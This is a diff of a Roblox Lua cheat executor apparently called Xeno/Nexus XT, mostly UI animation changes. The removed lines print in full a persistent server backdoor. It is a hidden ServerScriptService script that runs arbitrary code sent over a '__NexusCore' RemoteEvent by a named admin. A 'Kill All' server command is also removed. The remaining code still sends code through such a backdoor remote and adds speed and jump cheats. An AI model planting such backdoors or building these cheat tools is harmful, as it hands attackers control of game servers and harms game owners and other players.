@@ -40,7 +40,6 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local RS = game:GetService("ReplicatedStorage")
-local SSS = game:GetService("ServerScriptService")
 local localPlayer = Players.LocalPlayer
 
 -- LOGS
@@ -57,36 +56,17 @@ function Nexus:AddLog(msg, msgType)
     if self.updateConsoleUI then pcall(self.updateConsoleUI) end
 end
 
--- BACKDOOR SERVER-SIDE (persistente)
+-- SERVER-SIDE BRIDGE
 local function ensureBackdoor()
     if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then return Nexus.backdoorRemote end
     Nexus.backdoorRemote = RS:FindFirstChild("__NexusCore")
     if not Nexus.backdoorRemote then
-        Nexus.backdoorRemote = Instance.new("RemoteEvent")
-        Nexus.backdoorRemote.Name = "__NexusCore"
-        Nexus.backdoorRemote.Parent = RS
-        local listener = SSS:FindFirstChild("__NexusCoreListener")
-        if not listener then
-            listener = Instance.new("Script")
-            listener.Name = "__NexusCoreListener"
-            listener.Source = string.format([[
-                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusCore")
-                local players = game:GetService("Players")
-                local admin = "%s"
-                remote.OnServerEvent:Connect(function(plr, code)
-                    if plr.Name ~= admin then return end
-                    local fn, err = loadstring(code)
-                    if fn then
-                        local ok, res = pcall(fn)
-                        remote:FireClient(plr, ok and ("ok:"..tostring(res)) or ("err:"..tostring(res)))
-                    else
-                        remote:FireClient(plr, "compile_err:"..tostring(err))
-                    end
-                end)
-                while true do wait(10) if not remote.Parent then remote.Parent = game:GetService("ReplicatedStorage") end end
-            ]], Nexus.adminName)
-            listener.Parent = SSS
-        end
+        Nexus:AddLog("Server-side indisponivel: ponte __NexusCore nao encontrada.", "warning")
+        return nil
+    end
+    if not Nexus.backdoorRemote:IsA("RemoteEvent") then
+        Nexus:AddLog("__NexusCore encontrado, mas nao e RemoteEvent.", "error")
+        return nil
     end
     return Nexus.backdoorRemote
 end
@@ -95,6 +75,7 @@ function Nexus:ExecuteServer(code)
     if not code or code:gsub("%s","") == "" then self:AddLog("Código vazio", "error"); return false end
     self:AddLog("Executando servidor...", "info")
     local remote = ensureBackdoor()
+    if not remote then return false end
     local received = false
     local conn = remote.OnClientEvent:Connect(function(msg)
         if msg:find("ok:") then self:AddLog("Sucesso: "..msg:gsub("ok:",""), "success")
@@ -969,6 +950,10 @@ local function xenoButton(parent, text, pos, size, color, onClick)
     xenoCorner(button, 6)
     xenoStroke(button, DS.colors.border, 0.72, 1)
 
+    local scale = Instance.new("UIScale")
+    scale.Scale = 1
+    scale.Parent = button
+
     local baseColor = button.BackgroundColor3
     xenoButtonBaseColors[button] = baseColor
     button.MouseEnter:Connect(function()
@@ -976,12 +961,20 @@ local function xenoButton(parent, text, pos, size, color, onClick)
         TweenService:Create(button, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
             BackgroundColor3 = xenoColorShift(currentBase, 0.055)
         }):Play()
+        TweenService:Create(scale, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { Scale = 1.018 }):Play()
     end)
     button.MouseLeave:Connect(function()
         local currentBase = xenoButtonBaseColors[button] or baseColor
         TweenService:Create(button, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
             BackgroundColor3 = currentBase
         }):Play()
+        TweenService:Create(scale, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { Scale = 1 }):Play()
+    end)
+    button.MouseButton1Down:Connect(function()
+        TweenService:Create(scale, TweenInfo.new(0.08, Enum.EasingStyle.Quad), { Scale = 0.965 }):Play()
+    end)
+    button.MouseButton1Up:Connect(function()
+        TweenService:Create(scale, TweenInfo.new(0.10, Enum.EasingStyle.Quad), { Scale = 1.018 }):Play()
     end)
     if onClick then button.MouseButton1Click:Connect(onClick) end
     return button
@@ -1053,31 +1046,23 @@ createFloatingBall = function()
 
     local ball = Instance.new("TextButton")
     ball.Name = "XenoDock"
-    ball.Size = UDim2.new(0, 58, 0, 58)
-    ball.Position = UDim2.new(0.92, 0, 0.82, 0)
-    ball.BackgroundColor3 = DS.colors.chrome
+    ball.Size = UDim2.new(0, 42, 0, 42)
+    ball.Position = UDim2.new(0.92, 0, 0.80, 0)
+    ball.BackgroundColor3 = DS.colors.surface
     ball.BorderSizePixel = 0
     ball.AutoButtonColor = false
     ball.Text = "X"
     ball.TextColor3 = DS.colors.primary
     ball.Font = DS.font.bold
-    ball.TextSize = 22
+    ball.TextSize = 16
     ball.Parent = parent
-    xenoCorner(ball, 12)
-    xenoStroke(ball, DS.colors.primaryDark, 0.28, 1)
+    xenoCorner(ball, 21)
+    xenoStroke(ball, DS.colors.primaryDark, 0.18, 1)
 
-    local glow = Instance.new("Frame")
-    glow.Size = UDim2.new(1, 10, 1, 10)
-    glow.Position = UDim2.new(0, -5, 0, -5)
-    glow.BackgroundColor3 = DS.colors.secondary
-    glow.BackgroundTransparency = 0.86
-    glow.BorderSizePixel = 0
-    glow.ZIndex = ball.ZIndex - 1
-    glow.Parent = ball
-    xenoCorner(glow, 16)
-
-    local label = xenoLabel(ball, "XENO", UDim2.new(0, 0, 1, -16), UDim2.new(1, 0, 0, 12), DS.colors.textDim, 8, DS.font.bold, Enum.TextXAlignment.Center)
-    label.TextWrapped = false
+    local ballScale = Instance.new("UIScale")
+    ballScale.Scale = 0.72
+    ballScale.Parent = ball
+    TweenService:Create(ballScale, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
 
     local dragging = false
     local moved = false
@@ -1101,10 +1086,30 @@ createFloatingBall = function()
         if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
     end)
 
+    ball.MouseEnter:Connect(function()
+        TweenService:Create(ball, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
+            BackgroundColor3 = DS.colors.surfaceLight
+        }):Play()
+        TweenService:Create(ballScale, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { Scale = 1.08 }):Play()
+    end)
+    ball.MouseLeave:Connect(function()
+        TweenService:Create(ball, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
+            BackgroundColor3 = DS.colors.surface
+        }):Play()
+        TweenService:Create(ballScale, TweenInfo.new(0.12, Enum.EasingStyle.Quad), { Scale = 1 }):Play()
+    end)
+    ball.MouseButton1Down:Connect(function()
+        TweenService:Create(ballScale, TweenInfo.new(0.08, Enum.EasingStyle.Quad), { Scale = 0.92 }):Play()
+    end)
+
     ball.MouseButton1Click:Connect(function()
         if moved then return end
         if Nexus.mainGui and Nexus.mainGui.Parent then
-            Nexus.mainGui.Enabled = true
+            if Nexus.restoreMainUI then
+                Nexus.restoreMainUI()
+            else
+                Nexus.mainGui.Enabled = true
+            end
         else
             Nexus.mainGui = createMainUI()
         end
@@ -1132,17 +1137,7 @@ createMainUI = function()
     local windowW, windowH = 960, 600
     local titleH, sidebarW, statusH = 38, 166, 30
 
-    local shadow = Instance.new("ImageLabel")
-    shadow.Name = "WindowShadow"
-    shadow.Size = UDim2.new(0, windowW + 44, 0, windowH + 44)
-    shadow.Position = UDim2.new(0.5, -(windowW + 44) / 2, 0.5, -(windowH + 44) / 2)
-    shadow.BackgroundTransparency = 1
-    shadow.Image = "rbxassetid://1316047698"
-    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-    shadow.ImageTransparency = 0.42
-    shadow.ScaleType = Enum.ScaleType.Slice
-    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
-    shadow.Parent = gui
+    local shadow = nil
 
     local window = Instance.new("Frame")
     window.Name = "Window"
@@ -1153,6 +1148,13 @@ createMainUI = function()
     window.Parent = gui
     xenoCorner(window, 8)
     xenoStroke(window, DS.colors.border, 0.34, 1)
+
+    local windowScale = Instance.new("UIScale")
+    windowScale.Scale = 0.96
+    windowScale.Parent = window
+    window.BackgroundTransparency = 0.10
+    TweenService:Create(windowScale, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+    TweenService:Create(window, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { BackgroundTransparency = 0 }):Play()
 
     local titleBar = Instance.new("Frame")
     titleBar.Name = "TitleBar"
@@ -1182,20 +1184,45 @@ createMainUI = function()
     xenoLabel(titleBar, "Xeno", UDim2.new(0, 42, 0, 0), UDim2.new(0, 80, 1, 0), DS.colors.text, 14, DS.font.bold, Enum.TextXAlignment.Left)
     xenoLabel(titleBar, "Nexus XT UI", UDim2.new(0, 86, 0, 0), UDim2.new(0, 150, 1, 0), DS.colors.textMuted, 12, DS.font.main, Enum.TextXAlignment.Left)
 
-    local mini = xenoButton(titleBar, "-", UDim2.new(1, -86, 0, 6), UDim2.new(0, 34, 0, 26), DS.colors.chrome, function()
-        Nexus.isMinimized = true
-        gui.Enabled = false
+    local function showFloatingDock()
         if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
             Nexus.floatingBall = createFloatingBall()
         else
             Nexus.floatingBall.Visible = true
         end
+    end
+
+    local function minimizeToDock()
+        if Nexus.isMinimized then return end
+        Nexus.isMinimized = true
+        TweenService:Create(windowScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0.92 }):Play()
+        TweenService:Create(window, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { BackgroundTransparency = 0.18 }):Play()
+        task.delay(0.17, function()
+            if gui and gui.Parent and Nexus.isMinimized then
+                gui.Enabled = false
+                showFloatingDock()
+            end
+        end)
+    end
+
+    Nexus.restoreMainUI = function()
+        if not gui or not gui.Parent then return end
+        gui.Enabled = true
+        Nexus.isMinimized = false
+        windowScale.Scale = 0.94
+        window.BackgroundTransparency = 0.12
+        TweenService:Create(windowScale, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+        TweenService:Create(window, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { BackgroundTransparency = 0 }):Play()
+    end
+    Nexus.minimizeMainUI = minimizeToDock
+
+    local mini = xenoButton(titleBar, "-", UDim2.new(1, -86, 0, 6), UDim2.new(0, 34, 0, 26), DS.colors.chrome, function()
+        minimizeToDock()
     end)
     mini.TextSize = 18
 
     local close = xenoButton(titleBar, "x", UDim2.new(1, -46, 0, 6), UDim2.new(0, 34, 0, 26), DS.colors.chrome, function()
-        if Nexus.floatingBall and Nexus.floatingBall.Parent then Nexus.floatingBall:Destroy() end
-        gui:Destroy()
+        minimizeToDock()
     end)
     close.TextSize = 14
     close.TextColor3 = DS.colors.error
@@ -1248,10 +1275,23 @@ createMainUI = function()
     local activeMainTab = "editor"
 
     local function setMainTab(key)
+        local previousMainTab = activeMainTab
         activeMainTab = key
         for _, tab in ipairs(tabDefs) do
             local selected = tab.key == key
-            contentFrames[tab.key].Visible = selected
+            local frame = contentFrames[tab.key]
+            if selected then
+                frame.Visible = true
+                frame.Position = UDim2.new(0, previousMainTab == key and 0 or 10, 0, 0)
+                local frameScale = frame:FindFirstChild("TabScale")
+                if frameScale then
+                    frameScale.Scale = previousMainTab == key and 1 or 0.985
+                    TweenService:Create(frameScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { Scale = 1 }):Play()
+                end
+                TweenService:Create(frame, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { Position = UDim2.new(0, 0, 0, 0) }):Play()
+            else
+                frame.Visible = false
+            end
             xenoSetButtonColor(tabButtons[tab.key], selected and DS.colors.surfaceLight or DS.colors.sidebar)
             tabButtons[tab.key].TextColor3 = selected and DS.colors.primary or DS.colors.textDim
             local mark = tabButtons[tab.key]:FindFirstChild("ActiveMark")
@@ -1266,6 +1306,10 @@ createMainUI = function()
         frame.BackgroundTransparency = 1
         frame.Visible = tab.key == activeMainTab
         frame.Parent = contentRoot
+        local frameScale = Instance.new("UIScale")
+        frameScale.Name = "TabScale"
+        frameScale.Scale = 1
+        frameScale.Parent = frame
         contentFrames[tab.key] = frame
 
         local button = xenoButton(sidebar, tab.name, UDim2.new(0, 12, 0, 92 + (index - 1) * 42), UDim2.new(1, -24, 0, 34), DS.colors.sidebar, function()
@@ -1347,8 +1391,16 @@ createMainUI = function()
 
     local function setEditorTab(mode)
         activeEditor = mode
-        ssBox.Visible = mode == "server"
-        csBox.Visible = mode == "client"
+        local selectedBox = mode == "server" and ssBox or csBox
+        local hiddenBox = mode == "server" and csBox or ssBox
+        hiddenBox.Visible = false
+        selectedBox.Visible = true
+        selectedBox.BackgroundTransparency = 0.12
+        selectedBox.TextTransparency = 0.18
+        TweenService:Create(selectedBox, TweenInfo.new(0.14, Enum.EasingStyle.Quad), {
+            BackgroundTransparency = 0,
+            TextTransparency = 0
+        }):Play()
         xenoSetButtonColor(serverTab, mode == "server" and DS.colors.surfaceLight or DS.colors.chrome)
         xenoSetButtonColor(clientTab, mode == "client" and DS.colors.surfaceLight or DS.colors.chrome)
         serverTab.TextColor3 = mode == "server" and DS.colors.primary or DS.colors.textDim
@@ -1490,7 +1542,7 @@ createMainUI = function()
     local toolsFrame = contentFrames.tools
     local toolsPanel = xenoPanel(toolsFrame, UDim2.new(0, 14, 0, 14), UDim2.new(1, -28, 1, -28), DS.colors.surface, 8)
     xenoLabel(toolsPanel, "Tools", UDim2.new(0, 16, 0, 12), UDim2.new(0, 160, 0, 22), DS.colors.text, 16, DS.font.bold, Enum.TextXAlignment.Left)
-    xenoLabel(toolsPanel, "Utilities wired to the existing actions", UDim2.new(0, 68, 0, 14), UDim2.new(0, 260, 0, 18), DS.colors.textMuted, 11, DS.font.main, Enum.TextXAlignment.Left)
+    xenoLabel(toolsPanel, "Client utilities and server bridge status", UDim2.new(0, 68, 0, 14), UDim2.new(0, 320, 0, 18), DS.colors.textMuted, 11, DS.font.main, Enum.TextXAlignment.Left)
 
     local toolGrid = Instance.new("Frame")
     toolGrid.Position = UDim2.new(0, 16, 0, 52)
@@ -1504,15 +1556,22 @@ createMainUI = function()
     grid.Parent = toolGrid
 
     local toolBtns = {
-        { text = "Anti-Ban ON", color = DS.colors.success, action = function()
-            Nexus:AddLog("Anti-Ban ativado (simulacao)", "success")
+        { text = "Server Check", color = DS.colors.primaryDark, action = function()
+            local remote = RS:FindFirstChild("__NexusCore")
+            if remote and remote:IsA("RemoteEvent") then
+                Nexus.backdoorRemote = remote
+                Nexus:AddLog("Server bridge __NexusCore conectado.", "success")
+            else
+                Nexus:AddLog("Server bridge nao encontrado. Use Client ou configure no seu jogo.", "warning")
+            end
         end },
-        { text = "Anti-Ban OFF", color = DS.colors.error, action = function()
-            Nexus:AddLog("Anti-Ban desativado", "warning")
-        end },
-        { text = "Voice ON", color = DS.colors.success, action = function() Nexus:EnableVoiceProtection() end },
-        { text = "Reset Char", color = DS.colors.warning, action = function()
-            Nexus:ExecuteServer("local p = game:GetService('Players').LocalPlayer; if p.Character then p.Character:BreakJoints() end")
+        { text = "Client Reset", color = DS.colors.warning, action = function()
+            Nexus:ExecuteClient([[
+                local p = game:GetService("Players").LocalPlayer
+                local char = p and p.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum then hum.Health = 0 end
+            ]])
         end },
         { text = "Fullbright", color = DS.colors.secondary, action = function()
             Nexus:ExecuteClient([[
@@ -1526,15 +1585,27 @@ createMainUI = function()
                 end
             ]])
         end },
-        { text = "Kill All", color = DS.colors.error, action = function()
-            Nexus:ExecuteServer([[
-                for _, p in pairs(game:GetService("Players"):GetPlayers()) do
-                    if p ~= game:GetService("Players").LocalPlayer and p.Character then
-                        local h = p.Character:FindFirstChild("Humanoid")
-                        if h then h:BreakJoints() end
-                    end
+        { text = "Speed 100", color = DS.colors.success, action = function()
+            Nexus:ExecuteClient([[
+                local p = game:GetService("Players").LocalPlayer
+                local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+                if hum then hum.WalkSpeed = 100 end
+            ]])
+        end },
+        { text = "Jump 100", color = DS.colors.success, action = function()
+            Nexus:ExecuteClient([[
+                local p = game:GetService("Players").LocalPlayer
+                local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum.UseJumpPower = true
+                    hum.JumpPower = 100
                 end
             ]])
+        end },
+        { text = "Clear Console", color = DS.colors.surfaceLight, action = function()
+            Nexus.consoleLogs = {}
+            if Nexus.updateConsoleUI then Nexus.updateConsoleUI() end
+            Nexus:AddLog("Console limpo.", "info")
         end }
     }
     for _, bt in ipairs(toolBtns) do
